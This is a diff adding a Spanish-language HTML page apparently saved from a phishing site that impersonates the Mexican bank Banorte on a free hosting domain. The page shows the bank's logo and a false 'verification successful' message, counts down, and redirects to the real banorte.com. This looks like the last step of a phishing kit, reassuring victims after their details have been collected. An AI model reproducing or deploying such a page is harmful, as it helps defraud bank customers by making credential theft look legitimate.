@@ -1,0 +1,89 @@
+
+<!-- saved from url=(0042)https://banorte.brench77.repl.co/conf3.php -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+ 
+    
+   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">	
+  
+
+    <title>inicio</title>
+	
+	 <script language="JavaScript">
+ 
+    /* Determinamos el tiempo total en segundos */
+    var totalTiempo=10;
+    
+    var url="http://banorte.com/";
+ 
+    function updateReloj()
+    {
+        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, <br> <br> Verificación Exitosa. ";
+
+
+ 
+        if(totalTiempo==0)
+        {
+            window.location=url;
+        }else{
+            /* Restamos un segundo al tiempo restante */
+            totalTiempo-=1;
+            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
+            setTimeout("updateReloj()",1000);
+        }
+    }
+ 
+    window.onload=updateReloj;
+ 
+   </script></head>
+   
+ 
+  
+
+  <body><div class="content">
+    
+    <div class="container">
+	
+      <div class="row align-items-stretch justify-content-center no-gutters">
+        <div class="col-md-7">
+		
+          <div class="form h-100 contact-wrap p-5">
+		  
+		   <div align="center">
+<p><img src="./img/yDvl2u8.png" alt="Banorte" width="310" height="38"></p>
+
+			</div><br><br>
+		  
+		  		<div align="center">
+
+                
+									<h3 style="">
+<p style="text-align: center;"></p><p><img src="./img/loading.gif" alt="Punto Pe - Dominios en el Perú" width="132" height="132"></p>
+							
+	
+	     <div align="center"> 
+			  
+		<b><p id="CuentaAtras">Por favor, espera 15 segundos, <br> <br> Verificación Exitosa </p></b>
+			   
+	<br><br>
+			
+			   <span class="focus-input100"></span>
+			   </div>
+               <div align="center">
+			
+              </div>
+			  
+			  <br><br><br>
+          
+		 
+
+
+            <div id="form-message-warning mt-4"></div> 
+           
+	<div align="center">
+          </div>
+        </h3></div>
+      </div>
+    </div>
+
+  </div>
+</div></div></body></html>
